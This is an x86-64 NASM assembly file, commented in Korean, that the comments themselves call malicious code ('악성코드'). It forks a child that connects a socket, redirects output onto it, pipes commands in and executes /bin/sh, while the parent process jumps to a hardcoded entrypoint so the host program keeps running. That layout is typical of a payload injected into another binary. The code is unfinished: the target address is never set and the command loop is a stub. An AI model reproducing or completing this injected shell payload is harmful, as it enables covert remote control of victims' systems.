BITS 64

%include "inc64.inc"

section .data
; Constant
MAXDATASIZE equ 1024
SOCK_STREAM equ 1
AF_INET equ 2


; Data Structure
struc sockaddr_in ; 시작 offset 0
    .sin_family:    resb 2;2bytes
    .sin_port:      resb 2;2bytes
    .sin_addr:      resb 4;4bytes
    .sin_zero:      resb 8;8bytes
endstruc

struc socket, 16; 시작 offset
    .sockfd: resb 4; 4bytes
    .numbytes: resb 4; 4bytes
    .buf: resb MAXDATASIZE ; 1024bytes
endstruc

struc pipefd, 1048; 시작 offset
    resb 8
endstruc


; error message
forkErrorMessage: db "fork",10,0
socketErrorMessage: db "socket",10,0
connectErrorMessage: db "connect",10,0
pipeErrorMessage: db "pipe",10,0
closeErrorMessage: db "close",10,0
dup2ErrorMessage: db "dup2",10,0
recvfromErrorMessage: db "recvfrom",10,0
command: db "/bin/sh",0
argv: db command, 0
envp: db 0 
test_command: db "whoami",10,0


SECTION .text
global main
 
main:
    push rax                 ; save all clobbered registers
    push rcx                 ; (rcx and r11 destroyed by kernel)
    push rdx
    push rsi
    push rdi
    push r11

    jmp _fork1

_child:
    push rbp ;function 프롤로그
    mov rbp, rsp
    sub rsp, 2000 ; 여유 스택 공간 확보


    call _socket

    mov dword [rbp - socket.sockfd], eax ; save to socket fd
    
    call _connect

    call _pipe

    jmp _fork2

_child_execve:
    ;call _pipe
    ; close($rdi) 성공하면 0
    mov edi, dword[rbp - pipefd + 4] ; write
    mov rax, SYS_CLOSE
    syscall
    cmp rax, 0
    jne _closeFailed

    ;               $rdi      $rsi
    ; int dup2(int oldfd, int newfd);
    ; 실패하면 -1
    mov edi, dword[rbp - socket.sockfd]
    mov rsi, STDOUT_FILENO
    mov rax, SYS_DUP2
    syscall
    cmp rax, -1
    je _dup2Failed

    ;               $rdi      $rsi
    ; int dup2(int oldfd, int newfd);
    ; 실패하면 -1
    mov edi, dword[rbp - socket.sockfd]
    mov rsi, STDERR_FILENO
    mov rax, SYS_DUP2
    syscall
    cmp rax, -1
    je _dup2Failed

    ;               $rdi      $rsi
    ; int dup2(int oldfd, int newfd);
    ; 실패하면 -1
    mov edi, dword[rbp - pipefd] ;read
    mov rsi, STDIN_FILENO
    mov rax, SYS_DUP2
    syscall
    cmp rax, -1
    je _dup2Failed

    ; $rdi, $rsi, $rdx
    lea rdi, [rel $+command-$]
    lea rsi, [rel $+argv-$]
    lea rdx, [rel $+envp-$]
    mov rax, SYS_EXECVE
    syscall

    ; 여기는 execve 실패한 경우
    jmp _end


_parent_socket:
    ;call _pipe
    ; close($rdi) 성공하면 0
    mov edi, dword[rbp - pipefd] ; pipefd.read
    mov rax, SYS_CLOSE
    syscall
    cmp rax, 0
    jne _closeFailed

_loop:

    mov edi, dword[rbp - pipefd + 4] ;write
    lea rsi, [rel $+test_command-$]
    mov edx, 8
    mov rax, SYS_WRITE
    syscall


    





    ;mov rax, 1
    ;mov rdi, 1
    ;lea rsi, [rel $+forkErrorMessage-$]
    ;mov dword [rbp - sockaddr_in.sin_addr], 5
    ;mov rdx, [rbp  - sockaddr_in.sin_addr]
    ;syscall

_end:
    ;function 에필로그
    mov rsp, rbp
    pop rbp
    exit

_parent:
    pop r11
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rax

    push 0x4049a0            ; jump to entrypoint
    ret


_socket:
    ; socket($rdi, $rsi, $rdx, $rcx)
    mov rdi, AF_INET
    mov rsi, SOCK_STREAM
    mov rdx, 0
    mov rax, SYS_SOCKET
    syscall
    cmp rax, -1
    je _sockFailed
    ret

_connect:
    ; int connect(int sockfd, const struct sockaddr *addr,
    ;             socklen_t addrlen);
    mov edi, dword [rbp - socket.sockfd]
    lea rsi, [rbp - sockaddr_in]
    mov rdx, 0x10
    mov rax, SYS_CONNECT
    syscall
    cmp rax, 0
    jne _connectFailed
    ret

_pipe:
    ;               $rdi
    ; int pipe(int pipefd[2]);
    lea rdi, qword [rbp - pipefd]
    mov rax, SYS_PIPE
    syscall
    cmp rax, 0
    jne _pipeFailed
    ret

_fork1:
    ; fork해서 child process에서 악성코드 실행!
    mov rax, SYS_FORK
    syscall
    cmp rax, -1
    je _forkFailed
    cmp rax, 0
    jne _parent
    jmp _child

_fork2:
    ; fork해서 child process에서 악성코드 실행!
    mov rax, SYS_FORK
    syscall
    cmp rax, -1
    je _forkFailed
    cmp rax, 0
    jne _parent_socket
    jmp _child_execve



_forkFailed:
    mov rax, 1 ; write
    mov rdi, 1 ; stdoutpipeErrorMessage
    lea rsi, [rel $+forkErrorMessage-$]
    mov rdx, 5
    syscall
    mov rsp, rbp
    pop rbp
    exit

_sockFailed:
    mov rax, 1 ; write
    mov rdi, 1 ; stdout
    lea rsi, [rel $+socketErrorMessage-$]
    mov rdx, 7 ; len
    syscall
    mov rsp, rbp
    pop rbp
    exit

_connectFailed:
    mov rax, 1 ; write
    mov rdi, 1 ; stdout
    lea rsi, [rel $+connectErrorMessage-$]
    mov rdx, 8 ; len
    syscall
    mov rsp, rbp
    pop rbp
    exit

_pipeFailed:
    mov rax, 1 ; write
    mov rdi, 1 ; stdout
    lea rsi, [rel $+pipeErrorMessage-$]
    mov rdx, 5 ; len
    syscall
    mov rsp, rbp
    pop rbp
    exit

_closeFailed:
    mov rax, 1 ; write
    mov rdi, 1 ; stdout
    lea rsi, [rel $+closeErrorMessage-$]
    mov rdx, 6 ; len
    syscall
    mov rsp, rbp
    pop rbp
    exit

_dup2Failed:
    mov rax, 1 ; write
    mov rdi, 1 ; stdout
    lea rsi, [rel $+dup2ErrorMessage-$]
    mov rdx, 5 ; len
    syscall
    mov rsp, rbp
    pop rbp
    exit

_recvfromFailed:
    mov rax, 1 ; write
    mov rdi, 1 ; stdout
    lea rsi, [rel $+recvfromErrorMessage-$]
    mov rdx, 9 ; len
    syscall
    mov rsp, rbp
    pop rbp
    exit